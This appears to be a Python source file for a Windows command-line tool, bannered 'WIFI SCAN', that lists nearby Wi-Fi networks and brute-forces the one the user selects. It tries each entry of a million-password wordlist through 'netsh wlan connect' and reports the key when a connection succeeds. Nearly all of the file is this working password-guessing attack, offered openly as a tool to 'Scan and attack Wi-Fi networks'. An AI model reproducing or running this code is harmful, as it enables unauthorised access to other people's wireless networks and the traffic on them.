import subprocess
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich import box
from rich.align import Align
from rich.progress import Progress, BarColumn, TextColumn, SpinnerColumn, TimeRemainingColumn
import inquirer
import os

console = Console()

BANNER = """
[bold cyan]
██╗    ██╗██╗███████╗██╗    ███████╗ ██████╗ █████╗ ███╗   ██╗
██║    ██║██║██╔════╝██║    ██╔════╝██╔════╝██╔══██╗████╗  ██║
██║ █╗ ██║██║█████╗  ██║    ███████╗██║     ███████║██╔██╗ ██║
██║███╗██║██║██╔══╝  ██║    ╚════██║██║     ██╔══██║██║╚██╗██║
╚███╔███╔╝██║██║     ██║    ███████║╚██████╗██║  ██║██║ ╚████║
 ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝
[/bold cyan]"""

def fancy_status(message, style="bold green"):
    return f"[{style}]⚡ {message}[/{style}]"

def scan_wifi():
    try:
        # Run the command to scan for Wi-Fi networks
        result = subprocess.run(['netsh', 'wlan', 'show', 'networks', 'mode=Bssid'], capture_output=True, text=True, timeout=30)
        output = result.stdout

        if result.returncode != 0:
            console.print(f"[bold red]Error:[/bold red] {result.stderr}")
            return []

        # Parse the output to extract Wi-Fi network information
        networks = []
        current_network = {}
        for line in output.split('\n'):
            line = line.strip()
            if line.startswith('SSID'):
                if current_network:
                    networks.append(current_network)
                    current_network = {}
                parts = line.split(': ', 1)
                if len(parts) > 1:
                    current_network['SSID'] = parts[1]
            elif line.startswith('Signal'):
                parts = line.split(': ', 1)
                if len(parts) > 1:
                    # Convert signal strength to integer
                    signal_strength = int(parts[1].replace('%', '').strip())
                    current_network['Signal'] = signal_strength
            elif line.startswith('BSSID'):
                parts = line.split(': ', 1)
                if len(parts) > 1:
                    current_network['BSSID'] = parts[1]
            elif line.startswith('Authentication'):
                parts = line.split(': ', 1)
                if len(parts) > 1:
                    current_network['Authentication'] = parts[1]
            elif line.startswith('Encryption'):
                parts = line.split(': ', 1)
                if len(parts) > 1:
                    current_network['Encryption'] = parts[1]
        if current_network:
            networks.append(current_network)

        # Sort networks by signal strength in descending order
        networks.sort(key=lambda x: x.get('Signal', 0), reverse=True)

        return networks

    except subprocess.TimeoutExpired:
        console.print(f"[bold red]Error:[/bold red] Wi-Fi scan timed out.")
        return []
    except Exception as e:
        console.print(f"[bold red]Error:[/bold red] {str(e)}")
        return []

def display_wifi_networks(networks):
    table = Table(
        title="[bold cyan]Available Wi-Fi Networks[/bold cyan]",
        box=box.HEAVY_EDGE,
        expand=True,
        header_style="bold magenta",
        border_style="cyan"
    )
    
    table.add_column("🔰 SSID", style="cyan", no_wrap=True)
    table.add_column("📶 Signal", style="magenta", justify="center")
    table.add_column("📍 BSSID", style="green")
    table.add_column("🔒 Authentication", style="yellow")
    table.add_column("🔐 Encryption", style="blue")

    for network in networks:
        signal = network.get('Signal', 0)
        signal_icon = "▂" if signal < 25 else "▂▄" if signal < 50 else "▂▄▆" if signal < 75 else "▂▄▆█"
        
        table.add_row(
            network.get('SSID', 'N/A'),
            f"[bold {'red' if signal < 30 else 'yellow' if signal < 70 else 'green'}]{signal}% {signal_icon}[/]",
            network.get('BSSID', 'N/A'),
            network.get('Authentication', 'N/A'),
            network.get('Encryption', 'N/A')
        )

    console.print(Panel(table, border_style="cyan", padding=(1, 2)))

def select_wifi_network(networks):
    choices = [f"{network.get('SSID', 'N/A')} (Signal: {network.get('Signal', 'N/A')}%)" for network in networks]
    questions = [
        inquirer.List('network',
                      message="Select a Wi-Fi network",
                      choices=choices)
    ]
    answer = inquirer.prompt(questions)
    return answer['network'] if answer else None

def read_passwords(file_path):
    try:
        console.print(f"Reading passwords from: {file_path}")
        if not os.path.exists(file_path):
            console.print(f"[bold red]File not found: {file_path}[/bold red]")
            return []
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as file:
            passwords = [line.strip() for line in file.readlines()]
            console.print(f"Read {len(passwords)} passwords")
            return passwords
    except Exception as e:
        console.print(f"[bold red]Error reading password file:[/bold red] {str(e)}")
        return []

def test_wifi_password(ssid, password):
    try:
        result = subprocess.run(['netsh', 'wlan', 'connect', f'name={ssid}', f'key={password}'], capture_output=True, text=True)
        return "successfully" in result.stdout.lower()
    except Exception as e:
        console.print(f"[bold red]Error testing password:[/bold red] {str(e)}")
        return False

def brute_force_wifi(ssid, passwords):
    total = len(passwords)
    with Progress(
        "[progress.description]{task.description}",
        SpinnerColumn("dots"),
        BarColumn(complete_style="green", finished_style="bold green"),
        TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
        TimeRemainingColumn(),
        TextColumn("[bold cyan]{task.fields[password]}[/]"),
        console=console,
        transient=True
    ) as progress:
        task = progress.add_task(
            f"[bold green]🔍 Testing passwords for {ssid}...", 
            total=total,
            password=""
        )
        
        for idx, password in enumerate(passwords, 1):
            progress.update(task, 
                          advance=1, 
                          password=f"Testing: {password}",
                          description=f"[bold green]🔍 Testing passwords for {ssid}... ({idx}/{total})")
            
            if test_wifi_password(ssid, password):
                console.print(Panel(
                    f"[bold green]🎉 Success![/bold green]\nPassword for [cyan]{ssid}[/cyan] is: [bold yellow]{password}[/bold yellow]",
                    border_style="green",
                    title="[bold green]Password Found![/bold green]",
                    padding=(1, 2)
                ))
                return True
                
        console.print(Panel(
            f"[bold red]❌ Failed to find the password for [cyan]{ssid}[/cyan][/bold red]",
            border_style="red",
            title="[bold red]Attack Failed[/bold red]",
            padding=(1, 2)
        ))
        return False

def start_wifi_scan():
    console.clear()
    console.print(Align.center(BANNER))
    console.print(Panel(
        Align.center("[bold blue]    Wi-Fi Network Scanner[/bold blue]\n[dim]Scan and attack Wi-Fi networks[/dim]"),
        box=box.DOUBLE,
        style="cyan",
        padding=(1, 2)
    ))
    
    with console.status("[bold green]🔍 Scanning for Wi-Fi networks...[/bold green]", spinner="dots"):
        networks = scan_wifi()
    
    if networks:
        display_wifi_networks(networks)
        selected_network = select_wifi_network(networks)
        if selected_network:
            ssid = selected_network.split(' (')[0]
            console.print(Panel(
                f"[bold green]Selected Network:[/bold green] [cyan]{selected_network}[/cyan]",
                border_style="green",
                padding=(1, 2)
            ))
            
            password_file = os.path.join('Wifi_Scan', 'Passwords', '10-million-password-list-top-1000000.txt')
            with console.status(f"[bold cyan]📚 Loading password list: {password_file}[/bold cyan]", spinner="dots"):
                passwords = read_passwords(password_file)
                
            if passwords:
                brute_force_wifi(ssid, passwords)
            else:
                console.print(Panel(
                    "[bold red]No passwords found in the file.[/bold red]",
                    border_style="red",
                    title="[bold red]Error[/bold red]",
                    padding=(1, 2)
                ))
        else:
            console.print(Panel(
                "[bold yellow]No network selected.[/bold yellow]",
                border_style="yellow",
                padding=(1, 2)
            ))
    else:
        console.print(Panel(
            "[bold red]No Wi-Fi networks found.[/bold red]",
            border_style="red",
            title="[bold red]Error[/bold red]",
            padding=(1, 2)
        ))